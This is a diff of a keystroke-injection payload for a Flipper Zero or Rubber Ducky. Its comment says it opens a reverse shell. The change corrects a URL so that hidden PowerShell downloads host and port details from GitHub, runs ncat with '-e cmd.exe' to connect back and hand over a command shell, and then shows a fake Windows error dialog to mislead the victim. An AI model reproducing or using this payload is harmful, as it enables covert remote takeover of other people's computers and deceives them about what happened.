@@ -1,5 +1,5 @@
 REM This will the main script for the Flipper Zero or Rubberducky to pull and then send a reverse shell. Update the corect url in line 4.
 GUI r
 DELAY 500
-STRING powershell -w hidden -c "irm 'https://github.com/TheTorjanCaptain/Vulnerable-POC-Syntax/blob/4557daf9ee8e6a52a22decf16c01b31a281a2ed3/Flipper-RubberDucky/ngrokDetails.txt' | ForEach-Object { $x=$_.Split(' '); Start-Process 'ncat.exe' -ArgumentList $x[0],$x[1],'-e','cmd.exe' }; Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('The operation couldn’t be completed. Error 0x80004005.','Windows Error',0,16)"
+STRING powershell -w hidden -c "irm 'https://raw.githubusercontent.com/TheTorjanCaptain/Vulnerable-POC-Syntax/4557daf9ee8e6a52a22decf16c01b31a281a2ed3/Flipper-RubberDucky/ngrokDetails.txt' | ForEach-Object { $x=$_.Split(' '); Start-Process 'ncat.exe' -ArgumentList $x[0],$x[1],'-e','cmd.exe' }; Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('The operation couldn’t be completed. Error 0x80004005.','Windows Error',0,16)"
 ENTER
